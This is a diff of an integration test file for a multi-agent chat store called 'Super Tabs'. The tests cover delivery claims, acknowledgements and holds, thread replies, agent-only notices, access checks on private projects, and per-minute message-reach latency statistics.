-    const assigned = await run(tab, { type: 'work.assign', conversationId: 'lead', agentId: lead })
+    const assigned = await storeAssignment(db, tab, 'lead', lead)
     const before = (await store.read(owner, tab)).state.agents[0]!.configurationVersion!
     const command: Command = { type: 'agent.configuration', previousVersion: before,
       configuration: { ...config, model: 'observed-model', effort: 'max', contextWindow: null } }
@@ -1274,61 +855,159 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const records = await db.superTabConfiguration.findMany({ where: { tabId: tab, agentId: lead }, orderBy: { revision: 'asc' } })
     expect(records).toHaveLength(2)
     expect(records[0]!.configuration).toEqual(config)
-    expect(records[1]).toMatchObject({ configuration: command.configuration, actorKey: `agent:${lead}`, assignmentIds: [assigned.result.assignmentId] })
+    expect(records[1]).toMatchObject({ configuration: command.configuration, actorKey: `agent:${lead}`, assignmentIds: [assigned.id] })
     expect((await store.read(owner, tab)).state.conversations[0]!.assignment!.configuration).toEqual(config)
     const next = { ...command, previousVersion: current.configurationVersion!, configuration: config }
     const race = await Promise.allSettled([run(tab, next, host, lead), run(tab, { ...next, configuration: { ...config, effort: 'low' } }, host, lead)])
     expect(race.filter(r => r.status === 'fulfilled')).toHaveLength(1)
     expect(await db.superTabConfiguration.count({ where: { tabId: tab } })).toBe(3)
     // A Lead leaves only with its project, and a project with active work is not deleted.
-    await run(tab, { type: 'work.cancel', conversationId: 'lead', assignmentId: assigned.result.assignmentId as string, reason: 'The project closes.' })
+    await storeStatus(db, tab, 'lead', 'cancelled')
     await run(tab, { type: 'project.delete', projectId: 'lead' })
     await expect(run(tab, next, host, lead)).rejects.toMatchObject({ code: 'AGENT_UNAVAILABLE' })
     expect(await db.superTabConfiguration.count({ where: { tabId: tab } })).toBe(3)
   })
 
-  it('records a claimed delivery hold for the claim holder only and posts nothing in the conversation', async () => {
+  // Task #2840: how long a message takes to reach its reader, per pod per minute (superTabs/messageReachStats.ts). The rows a
+  // minute's line would carry for what [act] did.
+  async function reaches(act: () => Promise<unknown>): Promise<Array<Record<string, unknown>>> {
+    const log = vi.fn()
+    const stop = startMessageReachStats({ everyMs: 3_600_000, pod: 'test', log })
+    try { await act() } finally { stop() }
+    return (log.mock.calls[0]?.[1] as { rows?: Array<Record<string, unknown>> } | undefined)?.rows ?? []
+  }
+
+  it('times an agent\'s delivery from its creation to its host\'s first acknowledgement, once', async () => {
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
+    await run(tab, say('Please start.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    expect(await reaches(() => store.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: 'claim' }))).toEqual([])
+    const typed = await reaches(() => store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'done', uncertain: false }))
+    expect(typed).toEqual([{ reader: 'agent', via: 'delivery', n: 1, p50: expect.any(Number), p95: expect.any(Number), max: expect.any(Number) }])
+    expect(typed[0]!.max as number).toBeLessThan(60_000)
+    // The same acknowledgement again, as a host retries one it did not hear answered: the message reached it once.
+    expect(await reaches(() => store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'done', uncertain: false }))).toEqual([])
+  })
+
+  it('does not time a delivery its host could not confirm', async () => {
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
+    await run(tab, say('Please start.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    await store.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: 'claim' })
+    expect(await reaches(() => store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'unclear', uncertain: true }))).toEqual([])
+  })
+
+  it('times a person\'s read of new messages for each message someone else wrote, and nothing else', async () => {
+    // The owner and their own agent, in their chat: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, chat, say } = await ownAgent(tab)
+    const tail = (await store.messages(owner, tab, chat, {})).messages.at(-1)?.sequence ?? 0
+    await run(tab, { ...message('From the agent.'), conversationId: chat } as Command, owner, ada)
+    await run(tab, say('My own.'))
+    const read = await reaches(() => store.messages(owner, tab, chat, { after: tail }))
+    expect(read).toEqual([{ reader: 'person', via: 'read', n: 1, p50: expect.any(Number), p95: expect.any(Number), max: expect.any(Number) }])
+    // The page shown, a thread, or an agent's read is a re-read, not the message reaching its reader.
+    expect(await reaches(() => store.messages(owner, tab, chat, {}))).toEqual([])
+    expect(await reaches(() => store.messages(owner, tab, chat, { after: tail }, ada))).toEqual([])
+  })
+
+  // Task #2840's measure: what timing costs a read of new messages and a delivery acknowledgement, per call, on a seeded
+  // Swarm (run against main's store.ts for the before numbers), and the minute's line those calls make. Printed for the PR.
+  it('measures an after read and a delivery ack per call, and prints the minute line', async () => {
     const { tab, lead } = await fixture()
-    await run(tab, message('Please start.'))
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
-    await expect(store.delivery(host, tab, lead, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_draft' }))
+    const tail = (await store.messages(owner, tab, 'lead', {})).messages.at(-1)!.sequence
+    for (let i = 0; i < 20; i++) await run(tab, message(`Update ${i}.`), host, lead)
+    const log = vi.fn()
+    const stop = startMessageReachStats({ everyMs: 3_600_000, pod: 'api-7f9c-pod:1', log })
+    const reads = 200
+    for (let i = 0; i < 20; i++) await store.messages(owner, tab, 'lead', { after: tail })
+    let started = performance.now()
+    for (let i = 0; i < reads; i++) await store.messages(owner, tab, 'lead', { after: tail })
+    const readMs = (performance.now() - started) / reads
+    const acks = 20
+    // The owner's own agent takes them: a person posts in no project's channel (agentsOnly.test.ts).
+    const { ada, say } = await ownAgent(tab)
+    for (let i = 0; i < acks; i++) await run(tab, say(`Task ${i}.`))
+    const open = await store.deliveries(owner, tab, ada)
+    for (const d of open) await store.delivery(owner, tab, ada, d.id, { type: 'claim', claimId: `c-${d.id}` })
+    started = performance.now()
+    for (const d of open) await store.delivery(owner, tab, ada, d.id, { type: 'ack', claimId: `c-${d.id}`, receipt: 'typed', uncertain: false })
+    const ackMs = (performance.now() - started) / open.length
+    stop()
+    process.stderr.write(`[#2840 measure] per call: after read (20 rows) ${readMs.toFixed(2)} ms over ${reads}, delivery ack ${ackMs.toFixed(2)} ms over ${open.length}\n`)
+    process.stderr.write(`[#2840 sample] message reach latency ${JSON.stringify(log.mock.calls[0]?.[1] ?? null)}\n`)
+    expect(open.length).toBeGreaterThan(0)
+  }, 120_000)
+
+  it('records a claimed delivery hold for the claim holder only and posts nothing in the conversation', async () => {
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, chat, say } = await ownAgent(tab)
+    await run(tab, say('Please start.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    await expect(store.delivery(owner, tab, ada, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_draft' }))
       .rejects.toMatchObject({ code: 'NOT_CLAIMED' })
-    await store.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: 'claim' })
-    await expect(store.delivery(host, tab, lead, delivery.id, { type: 'hold', claimId: 'another', reason: 'team_waiting_draft' }))
+    await store.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: 'claim' })
+    await expect(store.delivery(owner, tab, ada, delivery.id, { type: 'hold', claimId: 'another', reason: 'team_waiting_draft' }))
       .rejects.toMatchObject({ code: 'CLAIM_CONFLICT' })
-    expect(await store.delivery(host, tab, lead, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_user' })).toEqual({ held: true })
+    expect(await store.delivery(owner, tab, ada, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_user' })).toEqual({ held: true })
     expect(await db.superTabDelivery.findUnique({ where: { id: delivery.id } })).toMatchObject({ holdReason: 'team_waiting_user' })
-    expect((await store.messages(owner, tab, 'lead', {})).messages.map(m => m.text)).toEqual(['Please start.'])
-    await store.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'done', uncertain: false })
-    expect(await store.delivery(host, tab, lead, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_idle' })).toEqual({ held: false })
+    expect((await store.messages(owner, tab, chat, {})).messages.filter(m => !memberRow(m)).map(m => m.text)).toEqual(['Please start.'])
+    await store.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'done', uncertain: false })
+    expect(await store.delivery(owner, tab, ada, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_idle' })).toEqual({ held: false })
+  })
+
+  // Task #2427 (Huy, 11-03): the sidebar bolds a task only for a person's message, so each read conversation carries its newest
+  // main message from a person, and an agent's message leaves it.
+  it('reads each conversation\'s newest main message from a person, which an agent\'s message leaves', async () => {
+    // In the owner's own chat with their agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, chat: id, say } = await ownAgent(tab)
+    await run(tab, say('A person writes.'))
+    const chat = async () => (await storedState(tab)).conversations.find(c => c.id === id)!
+    const written = await chat()
+    expect(written.lastPersonSequence).toBe(written.lastMainSequence)
+    await run(tab, { ...message('An agent answers.'), conversationId: id } as Command, owner, ada)
+    const answered = await chat()
+    expect(answered.lastMainSequence).toBeGreaterThan(written.lastMainSequence!)
+    expect(answered.lastPersonSequence).toBe(written.lastMainSequence)
   })
 
   it('files replies under their thread root, summarises each thread for its page, and reads one thread', async () => {
+    // The PM and a worker of the project chat stored before #2207 talk there: only agents post in a project's channel (agentsOnly.test.ts).
     const { tab, lead } = await fixture()
     await invite(tab)
+    const task = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const worker = String((await run(tab, { type: 'agent.add', conversationId: task, machineId: 'test-host', harnessId: randomUUID(), name: 'Worker',
+      configuration: config, lead: false })).result.agentId)
+    await seat(tab, worker)
     const reply = (text: string, replyTo: string, extra: Record<string, unknown> = {}) =>
       ({ type: 'message.send', conversationId: 'lead', text, replyTo, recipientIds: [], ...extra }) as Command
-    const root = String((await run(tab, message('Should we do thread replies?'))).result.messageId)
-    const first = String((await run(tab, reply('Yes, threads.', root, { mentions: [owner.sub] }), host, lead)).result.messageId)
+    const root = String((await run(tab, message('Should we do thread replies?'), host, worker)).result.messageId)
+    const first = String((await run(tab, reply('Yes, threads.', root, { mentions: [peer.sub] }), host, lead)).result.messageId)
     // A reply only in its thread leaves the chat's newest main-stream message where it was; an also-sent one moves it.
     const lead1 = async () => (await store.read(owner, tab)).state.conversations.find(c => c.id === 'lead')!
     const afterFirst = await lead1()
     expect(afterFirst.lastMainSequence).toBe(afterFirst.lastMessageSequence - 1)
-    const second = String((await run(tab, reply('Agreed.', first, { alsoSend: true }), peer)).result.messageId)
-    const after = String((await run(tab, message('Next topic.'))).result.messageId)
+    const second = String((await run(tab, reply('Agreed.', first, { alsoSend: true }), host, worker)).result.messageId)
+    const after = String((await run(tab, message('Next topic.'), host, worker)).result.messageId)
     const afterAll = await lead1()
     expect(afterAll.lastMainSequence).toBe(afterAll.lastMessageSequence)
 
     // Agents read one feed: every reply, each with its thread root.
-    const feed = (await store.messages(host, tab, 'lead', {}, lead)).messages
+    const feed = (await store.messages(host, tab, 'lead', {}, lead)).messages.filter(m => !memberRow(m)) // and the row naming who added it (#2207)
     expect(feed.map(m => [m.id, m.thread, m.alsoInChat ?? null])).toEqual(
       [[root, root, null], [first, root, null], [second, root, true], [after, after, null]])
     expect(feed.find(m => m.id === second)!.replyTo).toBe(first)
     const page = await store.messages(owner, tab, 'lead', {})
     const last = feed.find(m => m.id === second)!
     expect(page.threads).toEqual([{ id: root, replies: 2, lastSequence: last.sequence, lastAt: last.createdAt,
-      authors: [expect.objectContaining({ kind: 'person', id: peer.sub }), expect.objectContaining({ kind: 'agent', id: lead })],
-      people: [owner.sub, peer.sub] }])
+      authors: [expect.objectContaining({ kind: 'agent', id: worker }), expect.objectContaining({ kind: 'agent', id: lead })],
+      people: [peer.sub] }])
     // A poll that reads only a new reply still learns its root's summary.
     const poll = await store.messages(owner, tab, 'lead', { after: feed.find(m => m.id === first)!.sequence })
     expect(poll.threads.map(t => [t.id, t.replies])).toEqual([[root, 2]])
@@ -1337,29 +1016,32 @@ describe('Super Tabs on a real Mongo replica set', () => {
     expect(thread.messages.map(m => m.id)).toEqual([root, first, second])
     expect(thread.threads.map(t => t.id)).toEqual([root])
 
-    // A person who leaves is no longer named, though their reply stays.
+    // A person tagged who leaves is no longer named; the replies stay.
     await run(tab, { type: 'member.remove', userId: peer.sub })
     const left = (await store.messages(owner, tab, 'lead', { thread: root })).threads[0]!
-    expect(left.people).toEqual([owner.sub])
-    expect(left.authors.map(a => a.id)).toEqual([lead])
+    expect(left.people).toEqual([])
+    expect(left.authors.map(a => a.id)).toEqual([worker, lead])
     expect(left.replies).toBe(2)
   })
 
   it('keeps a reply to a message written before threads inline, and refuses a thread of a conversation the reader cannot see', async () => {
-    const { tab } = await fixture()
+    // The PMs answer and post: only agents post in a project's channel (agentsOnly.test.ts).
+    const { tab, lead } = await fixture()
     await invite(tab)
     const old = randomUUID().replaceAll('-', '').slice(0, 24)
     await db.superTabMessage.create({ data: { id: old, tabId: tab, conversationId: 'lead', sequence: 0,
       author: { kind: 'person', id: owner.sub, name: owner.email, membershipGeneration: 'g' }, text: 'Before threads.', recipientIds: [], mentions: [] } })
     const answer = String((await run(tab, { type: 'message.send', conversationId: 'lead', text: 'Answered inline.', replyTo: old, recipientIds: [],
-      alsoSend: true }, peer)).result.messageId)
+      alsoSend: true }, host, lead)).result.messageId)
     const rows = (await store.messages(owner, tab, 'lead', {})).messages
     expect(rows.find(m => m.id === answer)).toMatchObject({ replyTo: old, thread: answer, alsoInChat: null })
     expect(rows.find(m => m.id === old)!.thread).toBeNull()
 
     const project = (await run(tab, { type: 'project.create', name: 'Private project', visibility: 'private', brief: '' })).result
     const hidden = String(project.conversationId)
-    const secret = String((await run(tab, { ...message('Private root'), conversationId: hidden } as Command)).result.messageId)
+    const hiddenLead = String((await run(tab, { type: 'agent.add', conversationId: hidden, machineId: 'test-host', harnessId: randomUUID(), name: 'Private lead',
+      configuration: config, lead: true })).result.agentId)
+    const secret = String((await run(tab, { ...message('Private root'), conversationId: hidden } as Command, host, hiddenLead)).result.messageId)
     await expect(store.messages(peer, tab, hidden, { thread: secret })).rejects.toMatchObject({ code: 'NOT_FOUND' })
     // A root named under another conversation reads nothing of it.
     expect((await store.messages(peer, tab, 'lead', { thread: secret })).messages).toEqual([])
@@ -1376,25 +1058,26 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const deliveries = (await store.deliveries(host, tab, lead)).filter(d => d.messageId === sent.result.messageId)
     expect(deliveries).toHaveLength(1)
     for (const person of [owner, peer]) {
-      expect((await store.messages(person, tab, 'lead', {})).messages).toEqual([])
+      // Only the row naming who added the Lead (#2207).
+      expect((await store.messages(person, tab, 'lead', {})).messages.filter(m => !memberRow(m))).toEqual([])
       expect((await store.messages(person, tab, 'lead', { messageId: sent.result.messageId as string })).messages).toEqual([])
     }
     expect((await store.read(owner, tab)).state.conversations.find(c => c.id === 'lead')!.lastMessageSequence).toBe(before)
-    expect((await store.messages(host, tab, 'lead', {}, lead)).messages.map(m => m.text)).toEqual(['Harness updated your built-in swarm-lead skill.'])
+    expect((await store.messages(host, tab, 'lead', {}, lead)).messages.filter(m => !memberRow(m)).map(m => m.text)).toEqual(['Harness updated your built-in swarm-lead skill.'])
     // Typed through the normal claim; a hold while the input box is busy is recorded on the delivery, so the delivery pass
     // knows its host still holds it (deliverySettle.ts), and writes no row people would see.
     const claimed = await store.delivery(host, tab, lead, deliveries[0]!.id, { type: 'claim', claimId: 'claim' })
     expect(claimed.message).toMatchObject({ text: 'Harness updated your built-in swarm-lead skill.', source: { kind: 'agent-only' } })
     expect(await store.delivery(host, tab, lead, deliveries[0]!.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_draft' })).toEqual({ held: true })
     expect(await db.superTabDelivery.findUniqueOrThrow({ where: { id: deliveries[0]!.id } })).toMatchObject({ holdReason: 'team_waiting_draft' })
-    expect((await store.messages(owner, tab, 'lead', {})).messages).toEqual([])
+    expect((await store.messages(owner, tab, 'lead', {})).messages.filter(m => !memberRow(m))).toEqual([])
   })
 
   it('delivers a worker\'s agent-only notice once in its group and lists it for no person and not for its Lead', async () => {
     const { tab, lead } = await fixture()
     const group = (await run(tab, { type: 'conversation.create', title: 'Worker task', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId as string
     const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(), name: 'Worker', configuration: config, lead: false })).result.agentId as string
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
+    await storeAssignment(db, tab, group, worker)
     const before = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.lastMessageSequence
     const notice: Command = { type: 'message.send', conversationId: group, text: 'Harness updated your built-in swarm-dev skill.',
       replyTo: null, recipientIds: [worker], agentOnly: true }
@@ -1409,24 +1092,31 @@ describe('Super Tabs on a real Mongo replica set', () => {
   })
 
   it('reads past more than a page of hidden notices so a person still reaches every later message', async () => {
+    // A worker of the project chat stored before #2207 posts around them: only agents post in a project's channel (agentsOnly.test.ts).
     const { tab, lead } = await fixture()
-    const first = (await run(tab, message('Before the notices.'))).result.messageId as string
+    const task = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const worker = String((await run(tab, { type: 'agent.add', conversationId: task, machineId: 'test-host', harnessId: randomUUID(), name: 'Worker',
+      configuration: config, lead: false })).result.agentId)
+    await seat(tab, worker)
+    const first = (await run(tab, message('Before the notices.'), host, worker)).result.messageId as string
     for (let i = 0; i < 120; i++) {
       await run(tab, { type: 'message.send', conversationId: 'lead', text: `Notice ${i}.`, replyTo: null, recipientIds: [lead], agentOnly: true }, host, lead)
     }
-    const last = (await run(tab, message('After the notices.'))).result.messageId as string
+    const last = (await run(tab, message('After the notices.'), host, worker)).result.messageId as string
     // Desktop's first read, then its next read after the last row it shows (desktop/lib/super_tabs/controller.dart).
+    // Each after the row naming who added the Lead (#2207).
     const opened = await store.messages(owner, tab, 'lead', {})
-    expect(opened.messages.map(m => m.id)).toEqual([first, last])
+    const added = opened.messages[0]!.id
+    expect(opened.messages.map(m => m.id)).toEqual([added, first, last])
     expect(opened.next).toBeNull()
-    const tail = opened.messages[0]!.sequence
+    const tail = opened.messages[1]!.sequence
     expect((await store.messages(owner, tab, 'lead', { after: tail })).messages.map(m => m.id)).toEqual([last])
-    expect((await store.messages(owner, tab, 'lead', { before: opened.messages[1]!.sequence })).messages.map(m => m.id)).toEqual([first])
+    expect((await store.messages(owner, tab, 'lead', { before: opened.messages[2]!.sequence })).messages.map(m => m.id)).toEqual([added, first])
     // The Lead pages through all of its own notices, a full page then the rest.
     const page = await store.messages(host, tab, 'lead', {}, lead)
     expect(page.messages).toHaveLength(100)
     const rest = await store.messages(host, tab, 'lead', { before: page.next!.sequence, beforeId: page.next!.id }, lead)
-    expect([...rest.messages, ...page.messages].map(m => m.text)).toEqual(['Before the notices.', ...Array.from({ length: 120 }, (_, i) => `Notice ${i}.`), 'After the notices.'])
+    expect([...rest.messages, ...page.messages].filter(m => !memberRow(m)).map(m => m.text)).toEqual(['Before the notices.', ...Array.from({ length: 120 }, (_, i) => `Notice ${i}.`), 'After the notices.'])
     expect(rest.next).toBeNull()
   })
 
@@ -1464,37 +1154,44 @@ describe('Super Tabs on a real Mongo replica set', () => {
     }
     let opened!: Awaited<ReturnType<typeof store.messages>>
     expect(await examined(async () => { opened = await store.messages(owner, tab, 'lead', {}) })).toBeLessThan(6_000)
-    expect(opened.messages.map(m => m.id)).toEqual(['a-first', 'c-last'])
+    // Besides the row naming who added the Lead (#2207).
+    expect(opened.messages.filter(m => !memberRow(m)).map(m => m.id)).toEqual(['a-first', 'c-last'])
     expect(opened.next).toBeNull()
-    expect((await store.messages(owner, tab, 'lead', { after: 0 })).messages.map(m => m.id)).toEqual(['c-last'])
+    expect((await store.messages(owner, tab, 'lead', { after: 0 })).messages.filter(m => !memberRow(m)).map(m => m.id)).toEqual(['c-last'])
   })
 
   it('accepts an agent-only notice only from an agent to itself alone', async () => {
     const { tab, lead } = await fixture()
     const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(), name: 'Worker', configuration: config, lead: false })).result.agentId as string
+    // A member of the project chat stored before #2207, so naming it is refused for the notice alone.
+    await seat(tab, worker)
     const notice = (recipientIds: string[]): Command => ({ type: 'message.send', conversationId: 'lead', text: 'Skill changed.', replyTo: null, recipientIds, agentOnly: true })
-    await expect(run(tab, notice([lead]))).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
+    // A person's, in their own chat with the PM (a person posts in no project's channel, agentsOnly.test.ts).
+    await expect(run(tab, { ...notice([lead]), conversationId: await pmChat(tab) } as Command)).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
     await expect(run(tab, notice([worker]), host, lead)).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
     await expect(run(tab, notice([lead, worker]), host, lead)).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
     await expect(run(tab, notice([]), host, lead)).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
     // A tag would tell a person about a notice they cannot see.
     await invite(tab)
     await expect(run(tab, { ...notice([lead]), mentions: [peer.sub] } as Command, host, lead)).rejects.toMatchObject({ code: 'INVALID_RECIPIENT' })
-    expect((await store.messages(owner, tab, 'lead', {})).messages).toEqual([])
+    // Only the row naming who added the Lead (#2207), and the one saying the Worker joined the project.
+    expect((await store.messages(owner, tab, 'lead', {})).messages.filter(m => !memberRow(m) && !m.text.includes('works in its tasks'))).toEqual([])
   })
 
   it('stores the current delivery hold and its first time without a conversation notice', async () => {
-    const { tab, lead } = await fixture()
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, chat, say } = await ownAgent(tab)
     let now = Date.now()
     const timed = new SuperTabStore(db, () => now)
-    await run(tab, message('Keep the reason beside this instruction.'))
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
-    await timed.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: 'claim' })
+    await run(tab, say('Keep the reason beside this instruction.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    await timed.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: 'claim' })
     const since = new Date(now)
     for (const reason of ['team_waiting_idle', 'team_waiting_user', 'team_waiting_draft', 'team_waiting_control', 'team_waiting_unavailable'] as const) {
-      await timed.delivery(host, tab, lead, delivery.id, { type: 'hold', claimId: 'claim', reason })
+      await timed.delivery(owner, tab, ada, delivery.id, { type: 'hold', claimId: 'claim', reason })
       expect(await db.superTabDelivery.findUnique({ where: { id: delivery.id } })).toMatchObject({ holdReason: reason, holdSince: since })
-      const rows = (await timed.messages(owner, tab, 'lead', {})).messages
+      const rows = (await timed.messages(owner, tab, chat, {})).messages.filter(m => !memberRow(m))
       expect(rows).toHaveLength(1)
       expect(rows[0]!.deliveries[0]).toMatchObject({ holdReason: reason, holdSince: since })
       now += 5000
@@ -1502,10 +1199,13 @@ describe('Super Tabs on a real Mongo replica set', () => {
   })
 
   it.each(['delivered', 'answered', 'cancelled'] as const)('clears a delivery hold when it becomes %s', async status => {
-    const { tab } = await fixture()
+    const { tab, lead } = await fixture()
     const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(), name: 'Worker',
       configuration: config, lead: false })).result.agentId as string
-    await run(tab, { ...message('Finish this held instruction.'), recipientIds: [worker] } as Command)
+    // A member of the project chat stored before #2207.
+    await seat(tab, worker)
+    // The PM's: only agents post in a project's channel (agentsOnly.test.ts).
+    await run(tab, { ...message('Finish this held instruction.'), recipientIds: [worker] } as Command, host, lead)
     const delivery = (await store.deliveries(host, tab, worker))[0]!
     await store.delivery(host, tab, worker, delivery.id, { type: 'claim', claimId: 'claim' })
     await store.delivery(host, tab, worker, delivery.id, { type: 'hold', claimId: 'claim', reason: 'team_waiting_idle' })
@@ -1519,26 +1219,28 @@ describe('Super Tabs on a real Mongo replica set', () => {
   })
 
   it('keeps delivery and answer times stable, including an answer after the terminal acknowledged delivery', async () => {
-    const { tab, lead } = await fixture()
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, say } = await ownAgent(tab)
     let now = Date.now()
     const timed = new SuperTabStore(db, () => now)
-    await run(tab, message('Record this reply duration.'))
-    const delivery = (await store.deliveries(host, tab, lead))[0]!
-    await timed.delivery(host, tab, lead, delivery.id, { type: 'claim', claimId: 'claim' })
-    await timed.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'typed', uncertain: false })
+    await run(tab, say('Record this reply duration.'))
+    const delivery = (await store.deliveries(owner, tab, ada))[0]!
+    await timed.delivery(owner, tab, ada, delivery.id, { type: 'claim', claimId: 'claim' })
+    await timed.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'typed', uncertain: false })
     const deliveredAt = new Date(now)
     now += 72000
-    await timed.delivery(host, tab, lead, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'typed', uncertain: false })
-    await timed.execute(host, tab, { operationId: randomUUID(), command: {
-      type: 'message.send', conversationId: 'lead', text: 'Done.', replyTo: delivery.messageId, recipientIds: [],
-    } }, lead)
-    const row = (await timed.messages(owner, tab, 'lead', { messageId: delivery.messageId })).messages[0]!
+    await timed.delivery(owner, tab, ada, delivery.id, { type: 'ack', claimId: 'claim', receipt: 'typed', uncertain: false })
+    await timed.execute(owner, tab, { operationId: randomUUID(), command: {
+      type: 'message.send', conversationId: delivery.conversationId, text: 'Done.', replyTo: delivery.messageId, recipientIds: [],
+    } }, ada)
+    const row = (await timed.messages(owner, tab, delivery.conversationId, { messageId: delivery.messageId })).messages[0]!
     expect(row.deliveries[0]).toMatchObject({ status: 'answered', deliveredAt, answeredAt: new Date(now) })
   })
 
   it('a withdrawn host can retire its receipt without regaining conversation access', async () => {
     const { tab, lead } = await fixture()
-    await run(tab, message('Keep the execution receipt after removal.'))
+    await (await crew(tab, lead)).say('Keep the execution receipt after removal.')
     const first = (await store.deliveries(host, tab, lead))[0]!
     await store.delivery(host, tab, lead, first.id, { type: 'claim', claimId: 'claim' })
     await store.delivery(host, tab, lead, first.id, { type: 'ack', claimId: 'claim', receipt: 'unclear', uncertain: true })
@@ -1558,45 +1260,49 @@ describe('Super Tabs on a real Mongo replica set', () => {
   })
 
   it('resolves uncertain input once, preserves native evidence, and fences late host acknowledgements', async () => {
-    const { tab, lead } = await fixture()
+    // The owner's own agent: a person posts in no project's channel (agentsOnly.test.ts).
+    const { tab } = await fixture()
+    const { ada, chat, say } = await ownAgent(tab)
     await invite(tab)
-    await run(tab, message('Check the exact revision.'))
-    const first = (await store.deliveries(host, tab, lead))[0]!
+    await run(tab, say('Check the exact revision.'))
+    const first = (await store.deliveries(owner, tab, ada))[0]!
     const claimId = randomUUID()
-    await store.delivery(host, tab, lead, first.id, { type: 'claim', claimId })
-    await store.delivery(host, tab, lead, first.id, { type: 'ack', claimId, receipt: 'lost-native-ack', uncertain: true })
+    await store.delivery(owner, tab, ada, first.id, { type: 'claim', claimId })
+    await store.delivery(owner, tab, ada, first.id, { type: 'ack', claimId, receipt: 'lost-native-ack', uncertain: true })
     const resend: Command = { type: 'delivery.resolve', deliveryId: first.id, resolution: 'resend' }
-    await expect(run(tab, resend, host, lead)).rejects.toMatchObject({ code: 'HUMAN_REQUIRED' })
+    await expect(run(tab, resend, owner, ada)).rejects.toMatchObject({ code: 'HUMAN_REQUIRED' })
     const operationId = randomUUID()
-    const repeated = await Promise.all(Array.from({ length: 3 }, () => run(tab, resend, peer, undefined, operationId)))
+    const repeated = await Promise.all(Array.from({ length: 3 }, () => run(tab, resend, owner, undefined, operationId)))
     expect(new Set(repeated.map(r => r.result.messageId)).size).toBe(1)
-    const pending = await store.deliveries(host, tab, lead)
+    const pending = await store.deliveries(owner, tab, ada)
     expect(pending).toHaveLength(1)
     expect(pending[0]!.id).not.toBe(first.id)
-    expect(await store.deliveryReceipt(host, tab, lead, first.id)).toEqual({ id: first.id, status: 'superseded' })
+    expect(await store.deliveryReceipt(owner, tab, ada, first.id)).toEqual({ id: first.id, status: 'superseded' })
     expect((await db.superTabDelivery.findUnique({ where: { id: first.id } }))!.receipt).toBe('lost-native-ack')
-    await expect(run(tab, resend, peer)).rejects.toMatchObject({ code: 'DELIVERY_RESOLVED' })
-    await expect(store.delivery(host, tab, lead, first.id, { type: 'ack', claimId, receipt: 'late', uncertain: false }))
+    await expect(run(tab, resend)).rejects.toMatchObject({ code: 'DELIVERY_RESOLVED' })
+    await expect(store.delivery(owner, tab, ada, first.id, { type: 'ack', claimId, receipt: 'late', uncertain: false }))
       .rejects.toMatchObject({ code: 'DELIVERY_RESOLVED' })
-    const rows = (await store.messages(owner, tab, 'lead', {})).messages
+    const rows = (await store.messages(owner, tab, chat, {})).messages.filter(m => !memberRow(m))
     expect(rows).toHaveLength(2)
     expect(rows[1]!.text).toBe(rows[0]!.text)
     expect(rows[1]!.replyTo).toBe(rows[0]!.id)
-    expect(rows[1]!.author).toMatchObject({ id: peer.sub, kind: 'person' })
+    expect(rows[1]!.author).toMatchObject({ id: owner.sub, kind: 'person' })
     const second = pending[0]!
